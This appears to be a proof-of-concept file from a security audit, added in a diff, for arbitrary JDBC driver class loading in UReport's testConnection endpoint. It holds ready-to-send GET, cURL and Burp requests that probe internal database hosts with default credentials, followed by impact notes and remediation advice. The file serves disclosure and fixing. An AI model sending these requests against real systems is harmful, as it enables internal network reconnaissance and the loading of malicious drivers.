@@ -1,0 +1,79 @@
+================================================================================
+PoC for VULN-002: UReport JDBC Driver Arbitrary Class Loading
+================================================================================
+
+ Vulnerability: JDBC Driver Arbitrary Class Loading
+ Severity: MEDIUM (6.5 CVSS)
+ CWE: CWE-94
+ Affected Component: blade-starter-report
+
+================================================================================
+漏洞描述
+================================================================================
+
+UReport的testConnection方法允许用户指定任意JDBC驱动类名并加载，
+同时可以测试数据库连接。这可能导致恶意驱动加载和内网数据库探测。
+
+================================================================================
+PoC - JDBC驱动加载测试
+================================================================================
+
+请求方式: GET/POST
+目标端点: /ureport/datasource
+
+测试步骤:
+1. 尝试加载MySQL驱动:
+   GET /ureport/datasource?method=testConnection&driver=com.mysql.cj.jdbc.Driver&url=jdbc:mysql://localhost:3306/test&username=root&password=root
+
+2. 尝试加载PostgreSQL驱动:
+   GET /ureport/datasource?method=testConnection&driver=org.postgresql.Driver&url=jdbc:postgresql://localhost:5432/test&username=postgres&password=postgres
+
+3. 尝试加载任意类 (非JDBC驱动):
+   GET /ureport/datasource?method=testConnection&driver=java.lang.String&url=test&username=test&password=test
+
+================================================================================
+PoC - cURL 命令
+================================================================================
+
+# MySQL 探测
+curl -i 'http://target:port/ureport/datasource?method=testConnection&driver=com.mysql.cj.jdbc.Driver&url=jdbc:mysql://192.168.1.100:3306/test&username=root&password=pass'
+
+# 内网数据库探测
+curl -i 'http://target:port/ureport/datasource?method=testConnection&driver=org.postgresql.Driver&url=jdbc:postgresql://172.16.0.10:5432/testdb&username=admin&password=admin'
+
+================================================================================
+Burp Suite 请求示例
+================================================================================
+
+GET /ureport/datasource?method=testConnection&driver=com.mysql.cj.jdbc.Driver&url=jdbc:mysql://localhost:3306/test&username=root&password=root HTTP/1.1
+Host: target:port
+User-Agent: Mozilla/5.0
+Accept: */*
+
+================================================================================
+影响分析
+================================================================================
+
+1. 内网数据库探测: 可以探测内网数据库服务
+2. 信息泄露: 获取数据库连接状态和错误信息
+3. 恶意驱动加载: 加载包含恶意代码的JDBC驱动
+
+================================================================================
+修复建议
+================================================================================
+
+1. JDBC驱动白名单:
+   private static final Set<String> ALLOWED_DRIVERS = new HashSet<>(
+       Arrays.asList("com.mysql.cj.jdbc.Driver", "org.postgresql.Driver", ...)
+   );
+
+   if (!ALLOWED_DRIVERS.contains(driver)) {
+       throw new SecurityException("Driver not allowed");
+   }
+
+2. 数据库URL白名单验证
+
+3. 添加身份认证
+
+4. 限制功能只对管理员开放
+================================================================================
